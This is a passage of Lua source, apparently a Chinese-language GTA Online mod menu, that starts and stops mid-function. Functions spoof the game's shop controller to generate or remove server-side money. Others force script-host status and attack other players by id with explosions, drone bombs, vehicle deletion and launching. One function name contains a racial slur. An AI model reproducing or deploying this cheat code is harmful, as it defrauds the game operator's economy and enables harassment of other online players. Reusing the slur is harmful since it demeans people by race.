    selptfx.b = ptfx[2]--eff
    selptfx.a = ptfx[1]--ptfx
end

----粒子效果轰炸
local ptfxx = {lib = 'core', sel = 'ent_dst_concrete_large'}
function p_eff_bomb(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local targets = PLAYER.GET_PLAYER_PED(pid)
    local tar1 = ENTITY.GET_ENTITY_COORDS(targets, true)
    request_ptfx_asset(ptfxx.lib)
    GRAPHICS.USE_PARTICLE_FX_ASSET(ptfxx.lib)
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(ptfxx.sel, tar1.x, tar1.y, tar1.z + 1, 0, 0, 0, 5, true, true, true)
end
function sel_p_eff_bomb(value)
    ptfxx.sel = Fxcore.value[value]
    ptfxx.lib = 'core'
end

----事务处理程序
function TransactionSetter(hash, amount)
    SET_INT_GLOBAL(Global_Base.Transaction_Global + 1, INT_MAX - 1)
    SET_INT_GLOBAL(Global_Base.Transaction_Global + 7, INT_MAX)
    SET_INT_GLOBAL(Global_Base.Transaction_Global + 6, 0)
    SET_INT_GLOBAL(Global_Base.Transaction_Global + 5, 0)
    SET_INT_GLOBAL(Global_Base.Transaction_Global + 3, hash)
    SET_INT_GLOBAL(Global_Base.Transaction_Global + 2, amount)
    SET_INT_GLOBAL(Global_Base.Transaction_Global, 1)
end

----任务交易刷钱
function task_transaction(category, action_type, flag, item_t)
    local args = {["item"] = item_t[1], ["value"] = item_t[2]}
    if NETSHOPPING.NET_GAMESERVER_BASKET_IS_ACTIVE() then
        NETSHOPPING.NET_GAMESERVER_BASKET_END()
    end
    local mem = memory.alloc()
    local bool = NETSHOPPING.NET_GAMESERVER_BEGIN_SERVICE(mem, category, args.item, action_type, args.value, flag)
    util.spoof_script("shop_controller", function()
        if bool then
            local id = memory.read_int(mem)
            NETSHOPPING.NET_GAMESERVER_CHECKOUT_START(id)
        end
    end)
    repeat
        util.yield()
    until not NETSHOPPING.NET_GAMESERVER_TRANSACTION_IN_PROGRESS()
end
function task_transaction_money()
    for i, v in ipairs(task_transactions) do
        menu.action(task_transaction_opt, v.name, {}, "", function()
            task_transaction(util.joaat("CATEGORY_SERVICE_WITH_THRESHOLD"), util.joaat("NET_SHOP_ACTION_EARN"), 4, {util.joaat(v.task_name), v.value})
        end)
    end
end

--快速刷钱
function quick_brush_money(index)
    --获取可得最大值
    local max_amount = NETSHOPPING.NET_GAMESERVER_GET_PRICE(util.joaat("SERVICE_EARN_JUGGALO_STORY_MISSION"), util.joaat("CATEGORY_SERVICE_WITH_THRESHOLD"), true)
    task_transaction(util.joaat("CATEGORY_SERVICE_WITH_THRESHOLD"), util.joaat("NET_SHOP_ACTION_EARN"), index == 1 and 4 or 1, {util.joaat("SERVICE_EARN_JUGGALO_STORY_MISSION"), max_amount})
end
--快速删钱
function quick_remove_money(index)
    --获取可得最大值
    local max_amount = NETSHOPPING.NET_GAMESERVER_GET_PRICE(util.joaat("SERVICE_EARN_JUGGALO_STORY_MISSION"), util.joaat("CATEGORY_SERVICE_WITH_THRESHOLD"), true)
    task_transaction(util.joaat("CATEGORY_SERVICE_WITH_THRESHOLD"), util.joaat("NET_SHOP_ACTION_SPEND"), index == 1 and 4 or 1, {util.joaat("SERVICE_EARN_JUGGALO_STORY_MISSION"), max_amount})
end

----新掉钱袋
function new_drop_money()
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), false)
    local ped = create_ped(4, 605602864, pos.x, pos.y, pos.z, 0)
    PED.SET_AMBIENT_PEDS_DROP_MONEY(true)
    PED.SET_PED_MONEY(ped, math.random(2000))
    ENTITY.SET_ENTITY_ALPHA(ped, 0, false)
    ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(ped, PLAYER.PLAYER_PED_ID(), true)
    util.yield(50)
    ENTITY.SET_ENTITY_HEALTH(ped, 0, 0)
    util.yield(100)
    delete_entity(ped)
end


----自动CEO/首领
function auto_CEO()
    if not NETWORK.NETWORK_IS_SESSION_STARTED() then return end 
    for _, label in pairs(CEOLabels) do
        if IS_HELP_MSG_DISPLAYED(label) then
            if players.get_boss(PLAYER.PLAYER_ID()) == -1 then menu.trigger_commands("ceostart") end
            if players.get_org_type(PLAYER.PLAYER_ID()) == 1 then menu.trigger_commands("ceotomc") end
            util.toast("看起来你需要成为一个CEO")
        end
    end
    for _, label in pairs(MCLabels) do
        if IS_HELP_MSG_DISPLAYED(label) then
            if players.get_boss(PLAYER.PLAYER_ID()) == -1 then menu.trigger_commands("mcstart") end
            if players.get_org_type(PLAYER.PLAYER_ID()) == 0 then menu.trigger_commands("ceotomc") end
            util.toast("看起来你需要成为一个首领")
        end
    end
end

----自动任务脚本主机
function auto_task_script_host()
    if IS_SCRIPT_RUNNING("fm_mission_controller_2020") then
        --佩里科岛
        if NETWORK.NETWORK_GET_HOST_OF_SCRIPT("fm_mission_controller_2020", 0, 0) == PLAYER.PLAYER_ID() then
            draw_string("获得当前任务脚本主机", 0.03, 0.05, 0.4, 1)
        else
            force_script_host("fm_mission_controller_2020")
        end
    end

    if IS_SCRIPT_RUNNING("fm_mission_controller") then
        --其他任务
        if NETWORK.NETWORK_GET_HOST_OF_SCRIPT("fm_mission_controller", 0, 0) == PLAYER.PLAYER_ID() then
            draw_string("获得当前任务脚本主机", 0.03, 0.05, 0.4, 1)
        else
            force_script_host("fm_mission_controller")
        end
    end
end

----预设服装
function load_clothes(directory)
    local loaded_cloth = {}
    for i, filepath in ipairs(filesystem.list_files(directory)) do
        local _, filename, ext = string.match(filepath, "(.-)([^\\/]-%.?([^%.\\/]*))$")
        if not filesystem.is_dir(filepath) and ext == "json" then
            local cloth_date = get_info_from_jsonfile(filepath)
            table.insert(loaded_cloth, cloth_date)
        end
    end
    return loaded_cloth
end
function Preset_outfits()
    local outfit_folder = filesystem.scripts_dir() .. "daidaiScript\\Outfits"

    outs_folfer = menu.action(my_cloth, "打开文件夹", {}, "", function()
        util.open_folder(outfit_folder)
    end)
    outs_div = menu.divider(my_cloth, "衣柜")

    presetclothes = load_clothes(outfit_folder)
    for _, cloth in pairs(presetclothes) do
        cloth.name = menu.action(my_cloth, cloth.name.."["..cloth.type.."]", {}, "", function()
            if cloth.type == "女性" then--mp_f_freemode_01
                --change_model(PLAYER.PLAYER_ID(), MISC.GET_HASH_KEY("mp_f_freemode_01"))
                menu.trigger_commands("mpfemale")
            else
                --change_model(PLAYER.PLAYER_ID(), MISC.GET_HASH_KEY("mp_m_freemode_01"))
                menu.trigger_commands("mpmale")
            end
            PED.SET_PED_COMPONENT_VARIATION(PLAYER.GET_PLAYER_PED(PLAYER.PLAYER_ID()), 0, cloth.Head, cloth.Head_Variation, 0)--头部
            PED.SET_PED_COMPONENT_VARIATION(PLAYER.GET_PLAYER_PED(PLAYER.PLAYER_ID()), 1, cloth.Mask, cloth.Mask_Variation, 0)--面具
            PED.SET_PED_COMPONENT_VARIATION(PLAYER.GET_PLAYER_PED(PLAYER.PLAYER_ID()), 2, cloth.Hair, 0, 0)--发型
            PED1._SET_PED_HAIR_COLOR(PLAYER.GET_PLAYER_PED(PLAYER.PLAYER_ID()), cloth.Hair_Colour, cloth.highlight_Color)--发型颜色
            PED.SET_PED_COMPONENT_VARIATION(PLAYER.GET_PLAYER_PED(PLAYER.PLAYER_ID()), 3, cloth.Gloves_Torso, cloth.Gloves_Torso_Variation, 0)--手套/躯干
            PED.SET_PED_COMPONENT_VARIATION(PLAYER.GET_PLAYER_PED(PLAYER.PLAYER_ID()), 4, cloth.Pants, cloth.Pants_Variation, 0)--裤子
            PED.SET_PED_COMPONENT_VARIATION(PLAYER.GET_PLAYER_PED(PLAYER.PLAYER_ID()), 5, cloth.Parachute_Bag, cloth.Parachute_Bag_Variation, 0)--降落伞/背包
            PED.SET_PED_COMPONENT_VARIATION(PLAYER.GET_PLAYER_PED(PLAYER.PLAYER_ID()), 6, cloth.Shoes, cloth.Shoes_Variation, 0)--鞋子
            PED.SET_PED_COMPONENT_VARIATION(PLAYER.GET_PLAYER_PED(PLAYER.PLAYER_ID()), 7, cloth.Accessories, cloth.Accessories_Variation, 0)--配件
            PED.SET_PED_COMPONENT_VARIATION(PLAYER.GET_PLAYER_PED(PLAYER.PLAYER_ID()), 8, cloth.Top_2, cloth.Top_2_Variation, 0)--上身2
            PED.SET_PED_COMPONENT_VARIATION(PLAYER.GET_PLAYER_PED(PLAYER.PLAYER_ID()), 9, cloth.Top_3, cloth.Top_3_Variation, 0)--上身3
            PED.SET_PED_COMPONENT_VARIATION(PLAYER.GET_PLAYER_PED(PLAYER.PLAYER_ID()), 10, cloth.Decals, cloth.Decals_Variation, 0)--贴花
            PED.SET_PED_COMPONENT_VARIATION(PLAYER.GET_PLAYER_PED(PLAYER.PLAYER_ID()), 11, cloth.Top, cloth.Top_Variation, 0)--上身

            PED.SET_PED_PROP_INDEX(PLAYER.GET_PLAYER_PED(PLAYER.PLAYER_ID()), 0, cloth.Hat, cloth.Hat_Variation, 0)--帽子
            PED.SET_PED_PROP_INDEX(PLAYER.GET_PLAYER_PED(PLAYER.PLAYER_ID()), 1, cloth.Glasses, cloth.Glasses_Variation, 0)--眼镜
            PED.SET_PED_PROP_INDEX(PLAYER.GET_PLAYER_PED(PLAYER.PLAYER_ID()), 2, cloth.Earwear, cloth.Earwear_Variation, 0)--耳饰
            PED.SET_PED_PROP_INDEX(PLAYER.GET_PLAYER_PED(PLAYER.PLAYER_ID()), 6, cloth.Watch, cloth.Watch_Variation, 0)--手表
            PED.SET_PED_PROP_INDEX(PLAYER.GET_PLAYER_PED(PLAYER.PLAYER_ID()), 7, cloth.Bracelet, cloth.Bracelet_Variation, 0)--手链

        end)
    end
end
function endPreset_outfits()
    menu.delete(outs_folfer)
    menu.delete(outs_div)
    for _, cloth in pairs(presetclothes) do
        if cloth.name then
            menu.delete(cloth.name)
        end
    end
end


----不可见
function invisible(entity, value)
    VISIBLE_VALUE = value
    while VISIBLE_VALUE ~= 1 do
        if VISIBLE_VALUE == 2 then  --本地可见
            NETWORK.SET_ENTITY_LOCALLY_VISIBLE(entity)
        elseif VISIBLE_VALUE == 3 then  --不可见
            NETWORK.SET_ENTITY_LOCALLY_INVISIBLE(entity)
            ENTITY.SET_ENTITY_VISIBLE(entity, false, false)
        end
        util.yield()
    end
    ENTITY.SET_ENTITY_VISIBLE(entity, true, false)
end


----传送到他的载具
function tp_p_car(pid)
    if PED.IS_PED_IN_ANY_VEHICLE(PLAYER.GET_PLAYER_PED(pid)) then
        local player_veh = PED.GET_VEHICLE_PED_IS_USING(PLAYER.GET_PLAYER_PED(pid))
        local hash = ENTITY.GET_ENTITY_MODEL(player_veh)
        local seat_count = VEHICLE.GET_VEHICLE_MODEL_NUMBER_OF_SEATS(hash)
        for i = 0, seat_count - 1 do
            if VEHICLE.ARE_ANY_VEHICLE_SEATS_FREE(player_veh) then
                PED.SET_PED_INTO_VEHICLE(PLAYER.GET_PLAYER_PED(PLAYER.PLAYER_ID()), player_veh, i)
                break
            end
        end
    else
        util.toast("玩家不在载具")
    end
end





-----无人机投掷炸弹
function drone_drop(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end

    NETWORK.NETWORK_SET_IN_SPECTATOR_MODE(true, PLAYER.GET_PLAYER_PED(pid))
    HUD.SET_MINIMAP_IN_SPECTATOR_MODE(true, PLAYER.GET_PLAYER_PED(pid))
    util.yield(1000)

    local dronehash = 1657647215
    local bombhash = -449840286
    local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 0, 5)
    local drone = create_object(dronehash, pos.x, pos.y, pos.z)
    local bomb = create_object(bombhash, pos.x, pos.y, pos.z)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(bomb, drone, 0, 0, 0, -0.1, 90, 0, 0, false, false, false, false, 0, true, 0) 

    local dronepos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, -6, 8)
    local cam = CAM.CREATE_CAM_WITH_PARAMS("DEFAULT_SCRIPTED_CAMERA", dronepos.x, dronepos.y, dronepos.z, 0, 0, 0, 2, 2)
    local head = ENTITY.GET_ENTITY_ROTATION(PLAYER.GET_PLAYER_PED(pid), 0)
    CAM.SET_CAM_ROT(cam,head.x - 45, head.y, head.z, 2)
    CAM.SET_CAM_ACTIVE(cam, true)
    CAM.SET_CAM_FOV(cam, 90)
    CAM.RENDER_SCRIPT_CAMS(true, true, 100, true, true, 0)
    
    local end_time = os.time() + 2
    while end_time > os.time() do
        local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 0, 5)
        ENTITY.SET_ENTITY_COORDS(drone, pos.x, pos.y, pos.z, false, false, false, false)
        util.yield()
    end

    ENTITY.DETACH_ENTITY(bomb, true, true)
    while not ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(bomb) and not ENTITY.IS_ENTITY_IN_WATER(bomb) do
        util.yield()
    end
    local bombpos = ENTITY.GET_ENTITY_COORDS(bomb, false)
    FIRE.ADD_EXPLOSION(bombpos.x, bombpos.y, bombpos.z, 2, 1.0, true, false, 1, false)

    util.yield(1000)
    CAM.RENDER_SCRIPT_CAMS(false, true, 100, true, true, 0)
    CAM.DESTROY_CAM(cam, false)
    delete_entity(drone, bomb)
    NETWORK.NETWORK_SET_IN_SPECTATOR_MODE(true, PLAYER.PLAYER_PED_ID())
    HUD.SET_MINIMAP_IN_SPECTATOR_MODE(true, PLAYER.PLAYER_PED_ID())
end

----地图杀
function the_Map_Kill(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED(pid), true)
    if car ~= 0 then
        request_control(car, 3)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(car, 9000, 9000, -50, false, false, false)
        util.yield(1000)
        delete_entity(car)
    else
        notify("玩家不在载具")
    end
end

----黑人爆炸
function niggers_bomb(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local targetPlayerPed = PLAYER.GET_PLAYER_PED(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(targetPlayerPed, true)
    local model = MISC.GET_HASH_KEY("Player_One")
    for i = 0, 25 do
        create_ped(1, model, pos.x, pos.y, pos.z, 0)
    end
    FIRE.ADD_OWNED_EXPLOSION(targetPlayerPed, pos.x, pos.y, pos.z, 2, 50, true, false, 0.0)
end

----绘制实体抖动光标
function draw_ent_markers(ent)
    local modelHash = ENTITY.GET_ENTITY_MODEL(ent)
    local size = get_model_size(modelHash)
    local pos = ENTITY.GET_ENTITY_COORDS(ent, false)
    GRAPHICS.DRAW_MARKER(0, pos.x, pos.y, pos.z + size.z*2/3, 0, 180, 0, 0, 0, 0, 0.4, 0.4, 0.3, 200, 120, 250, 255, true, true, 0, 0, 0, 0, false)
end

----避免事故
function aa_thread()
    local player_cur_car = entities.get_user_vehicle_as_handle()
    if player_cur_car ~= 0 then
        local c = ENTITY.GET_ENTITY_COORDS(player_cur_car, true)
        local size = get_model_size(ENTITY.GET_ENTITY_MODEL(player_cur_car))
        for i= 1, 3 do
            if i == 1 then
                aad = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(player_cur_car, -size['x'], size['y']+0.1, size['z']/2)
            elseif i == 2 then
                aad = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(player_cur_car, 0.0, size['y']+0.1, size['z']/2)
            else
                aad = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(player_cur_car, size['x'], size['y']+0.1, size['z']/2)
            end
            if ENTITY.GET_ENTITY_SPEED(player_cur_car) > 10 then
                local ptr1, ptr2, ptr3, ptr4 = memory.alloc(), memory.alloc(), memory.alloc(), memory.alloc()
                SHAPETEST.GET_SHAPE_TEST_RESULT(SHAPETEST.START_EXPENSIVE_SYNCHRONOUS_SHAPE_TEST_LOS_PROBE(c.x,c.y,c.z,aad.x,aad.y,aad.z,-1,player_cur_car,4), ptr1, ptr2, ptr3, ptr4)
                local p1 = memory.read_int(ptr1)
                local p2 = memory.read_vector3(ptr2)
                local p3 = memory.read_vector3(ptr3)
                local p4 = memory.read_int(ptr4)
                local results = {p1, p2, p3, p4}
                if results[1] ~= 0 then
                    ENTITY.SET_ENTITY_VELOCITY(player_cur_car, 0.0, 0.0, 0.0)
                end
            end
        end
    end
end



----载具引擎快速开启
function fastoncar()
    local localped = PLAYER.PLAYER_PED_ID()
    if PED.IS_PED_GETTING_INTO_A_VEHICLE(localped) then
        local veh = PED.GET_VEHICLE_PED_IS_ENTERING(localped)
        if not VEHICLE.GET_IS_VEHICLE_ENGINE_RUNNING(veh) then
            VEHICLE.SET_VEHICLE_ENGINE_HEALTH(veh, 1000)
            VEHICLE.SET_VEHICLE_ENGINE_ON(veh, true, true, false)
        end
        if VEHICLE.GET_VEHICLE_CLASS(veh) == 15 then
            VEHICLE.SET_HELI_BLADES_FULL_SPEED(veh)
        end
    end
end

----自动锁门
function auto_locked(toggled)
    auto_lock_door = toggled
    if auto_lock_door then 
        while auto_lock_door do
            if PED.IS_PED_IN_ANY_VEHICLE(PLAYER.PLAYER_PED_ID(), true) then
                local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false)
                request_control(car)
                VEHICLE.SET_VEHICLE_DOORS_LOCKED(car, 2)
                if PAD.IS_CONTROL_PRESSED(0 , 23) then 
                    TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.PLAYER_PED_ID())
                end
            else
                local lastcar = PLAYER.GET_PLAYERS_LAST_VEHICLE()
                VEHICLE.SET_VEHICLE_DOORS_LOCKED(lastcar, 1)
            end
            util.yield()
        end
    else
        local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false)
        local lastcar = PLAYER.GET_PLAYERS_LAST_VEHICLE()
        VEHICLE.SET_VEHICLE_DOORS_LOCKED(car, 1)
        VEHICLE.SET_VEHICLE_DOORS_LOCKED(lastcar, 1)
    end
end

----解锁正在进入的载具
function unlockcar()
    local veh = PED.GET_VEHICLE_PED_IS_TRYING_TO_ENTER(PLAYER.PLAYER_PED_ID())
    if PED.IS_PED_IN_ANY_VEHICLE(PLAYER.PLAYER_PED_ID(), false) then
        local v = PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false)
        VEHICLE.SET_VEHICLE_DOORS_LOCKED(v, 1)
        VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(v, false)
        VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_PLAYER(v, PLAYER.PLAYER_ID(), false)
        ENTITY.FREEZE_ENTITY_POSITION(vehicle, false)
        util.yield()
    else
        if veh ~= 0 then
            request_control(veh)
            VEHICLE.SET_VEHICLE_DOORS_LOCKED(veh, 1)
            VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(veh, false)
            VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_PLAYER(veh, PLAYER.PLAYER_ID(), false)
            VEHICLE.SET_VEHICLE_HAS_BEEN_OWNED_BY_PLAYER(veh, false)
        end
    end
end

----给予所有武器
function give_all_weapon(ped)
    for _, weapon in pairs(weapon_list) do 
        WEAPON.GIVE_WEAPON_TO_PED(ped, weapon.hash, 9999, false, false)
    end
end
----移除所有武器
function remove_all_weapon(ped)
    for _, weapon in pairs(weapon_list) do 
        WEAPON.REMOVE_WEAPON_FROM_PED(ped, weapon.hash)
    end
end
----重型狙击枪攻击
function Heavy_gun_to_player(pid)
    if PLAYER.GET_PLAYER_PED(pid) ~= 0 then
        if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid), false)
        local hash = util.joaat("weapon_heavysniper")
        request_weapon_asset(hash)
        WEAPON.GIVE_WEAPON_TO_PED(PLAYER.PLAYER_PED_ID(), hash, 120, true, false)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z + 5, pos.x, pos.y, pos.z, 200, false, hash, PLAYER.PLAYER_PED_ID(), true, false, 2500.0)
    end
end
----烟花攻击
function firework_to_player(pid)
    if PLAYER.GET_PLAYER_PED(pid) ~= 0 then
        if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid), false)
        local hash = util.joaat("weapon_firework")
        request_weapon_asset(hash)
        WEAPON.GIVE_WEAPON_TO_PED(PLAYER.PLAYER_PED_ID(), hash, 120, true, false)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z + 3.0, pos.x, pos.y, pos.z - 2.0, 200, false, hash, 0, true, false, 2500.0)
    end
end
----原子波攻击
function atom_waves_to_player(pid)
    if PLAYER.GET_PLAYER_PED(pid) ~= 0 then
        if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid), false)
        local hash = util.joaat("weapon_raypistol")
        request_weapon_asset(hash)
        WEAPON.GIVE_WEAPON_TO_PED(PLAYER.PLAYER_PED_ID(), hash, 120, true, false)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z + 3.0, pos.x, pos.y, pos.z - 2.0, 200, false, hash, 0, true, false, 2500.0)
    end
end
----燃烧弹攻击
function Incendiary_to_player(pid)
    if PLAYER.GET_PLAYER_PED(pid) ~= 0 then
        if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid), false)
        local hash = util.joaat("weapon_molotov")
        request_weapon_asset(hash)
        WEAPON.GIVE_WEAPON_TO_PED(PLAYER.PLAYER_PED_ID(), hash, 120, true, false)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z, pos.x, pos.y, pos.z - 2.0, 200, false, hash, 0, true, false, 2500.0)
    end
end
----电磁脉冲攻击
function ElectroMagnetic_Pulse_to_player(pid)
    if PLAYER.GET_PLAYER_PED(pid) ~= 0 then
        if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid), false)
        local hash = util.joaat("weapon_emplauncher")
        request_weapon_asset(hash)
        WEAPON.GIVE_WEAPON_TO_PED(PLAYER.PLAYER_PED_ID(), hash, 120, true, false)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z, pos.x, pos.y, pos.z - 2.0, 200, false, hash, 0, true, false, 2500.0)
    end
end

----范围删除
function Scope_deletion(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local glitch_hash = util.joaat("p_spinning_anus_s")
    request_model(glitch_hash)
    local player = PLAYER.GET_PLAYER_PED(pid)
    local playerpos = ENTITY.GET_ENTITY_COORDS(player, false) 
    if PED.IS_PED_IN_ANY_VEHICLE(player, true) then
        deleplayercar(pid)
    end
    local stupid_object = entities.create_object(glitch_hash, playerpos)
    ENTITY.SET_ENTITY_VISIBLE(stupid_object, false)
    ENTITY.SET_ENTITY_INVINCIBLE(stupid_object, true)
    ENTITY.SET_ENTITY_COLLISION(stupid_object, true, true)
    delete_entity(stupid_object)
end

----弹飞玩家
function Bounce_Flying_Player(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    if PLAYER.GET_PLAYER_PED(pid) ~= 0 then
        local poopy_butt = util.joaat("adder")
        local player = PLAYER.GET_PLAYER_PED(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(player)
        pos.z = pos.z - 10
        request_model(poopy_butt)
        local vehicle = entities.create_vehicle(poopy_butt, pos, 0)
        ENTITY.SET_ENTITY_VISIBLE(vehicle, false)
        util.yield(250)
        if vehicle ~= 0 then
            ENTITY.APPLY_FORCE_TO_ENTITY(vehicle, 1, 0.0, 0.0, 100, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
            util.yield(250)
            delete_entity(vehicle)
        end
    end
end

----烟花发射玩家
function firework_send_player(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    if PLAYER.GET_PLAYER_PED(pid) ~= 0 then
        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid), false)
        local hash = util.joaat("weapon_firework")
        request_weapon_asset(hash)
        WEAPON.GIVE_WEAPON_TO_PED(PLAYER.PLAYER_PED_ID(), hash, 120, true, false)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z + 3.0, pos.x, pos.y, pos.z - 2.0, 200, false, hash, 0, true, false, 2500.0)

        local poopy_butt = util.joaat("adder")
        local player = PLAYER.GET_PLAYER_PED(pid)
        pos = ENTITY.GET_ENTITY_COORDS(player)
        pos.z = pos.z - 10
        request_model(poopy_butt)
        local vehicle = entities.create_vehicle(poopy_butt, pos, 0)
        ENTITY.SET_ENTITY_VISIBLE(vehicle, false)
        if vehicle ~= 0 then
            ENTITY.APPLY_FORCE_TO_ENTITY(vehicle, 1, 0.0, 0.0, 100, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
            util.yield(100)
            delete_entity(vehicle)
        end
    end
end


----空袭飞机
function air_strike_plane(toggled)
    air_strike_toggled = toggled
    local control = funConfig.controls.airstrikeaircraft
    if air_strike_toggled then
        notification("~y~~bold~空袭飞机可用于飞机和直升机", HudColour.blue)
        local msg = "按 ~%s~ 以使用空袭飞机"
        util.show_corner_help(msg:format("INPUT_VEH_HORN"))
    end
    while air_strike_toggled do
        if PED.IS_PED_IN_FLYING_VEHICLE(PLAYER.PLAYER_PED_ID()) and PAD.IS_CONTROL_PRESSED(2, control) then
            local vehicle = PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false)
            local vehPos = ENTITY.GET_ENTITY_COORDS(vehicle, false)
            local coord = waypoint_coord(vehPos.x, vehPos.y, vehPos.z)

            if vehPos.z - coord.z < 10.0 then --判断地面高度
                return false
            end
            local pos = get_random_offset_in_range(vehPos, 0.0, 5.0)
            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z - 3.0,pos.x, pos.y, coord.z,200,true, util.joaat("weapon_airstrike_rocket"),PLAYER.PLAYER_PED_ID(), true, false, 1000.0)
            util.yield(800)
        end
        util.yield()
    end
end


----烟花枪
function Firework_Gun()
    if WEAPON.GET_SELECTED_PED_WEAPON(PLAYER.PLAYER_PED_ID()) == 2138347493 and not ENTITY.DOES_ENTITY_EXIST(firework) then
        PLAYER.DISABLE_PLAYER_FIRING(PLAYER.PLAYER_PED_ID(), true)
        if PAD.IS_DISABLED_CONTROL_PRESSED(0, 24) then
            local hash = util.joaat("w_lr_firework_rocket")
            request_model(hash)
            local player_pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), 0.0, 0.5, 0.5)
            local dir = {}
            local c2 = get_offset_from_camera(15)
            dir.x = (c2.x - player_pos.x) * 15
            dir.y = (c2.y - player_pos.y) * 15
            dir.z = (c2.z - player_pos.z) * 15

            firework = OBJECT.CREATE_OBJECT_NO_OFFSET(hash, player_pos.x, player_pos.y, player_pos.z, true, false, false)
            local cam_rot = CAM.GET_GAMEPLAY_CAM_ROT(0)
            ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(firework, 1, dir.x, dir.y, dir.z, false, false, false, false)
            ENTITY.SET_ENTITY_ROTATION(firework, cam_rot.x, cam_rot.y, cam_rot.z, 0, true)
            ENTITY.SET_ENTITY_HAS_GRAVITY(firework, false)

            request_ptfx_asset("scr_rcpaparazzo1")
            GRAPHICS.USE_PARTICLE_FX_ASSET("scr_rcpaparazzo1")
            local effect = GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY("scr_mich4_firework_trail_spawn", firework, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1.0, false, false, false, 0, 0, 0, 0)
            GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(effect, 255, 255, 255, 0)
            local timer = 150
            while not ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(firework) and timer > 0 do
                if WEAPON.GET_SELECTED_PED_WEAPON(PLAYER.PLAYER_PED_ID()) == 2138347493 then
                    PLAYER.DISABLE_PLAYER_FIRING(PLAYER.PLAYER_PED_ID(), true)
                end
                timer = timer - 1
                util.yield()
            end
            if timer <= 0 or ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(firework) then
                GRAPHICS.STOP_PARTICLE_FX_LOOPED(effect, false)
                local fireworkPos = ENTITY.GET_ENTITY_COORDS(firework, true)
                delete_entity(firework)
                for i = 1, 10 do
                    local model = util.joaat("adder")
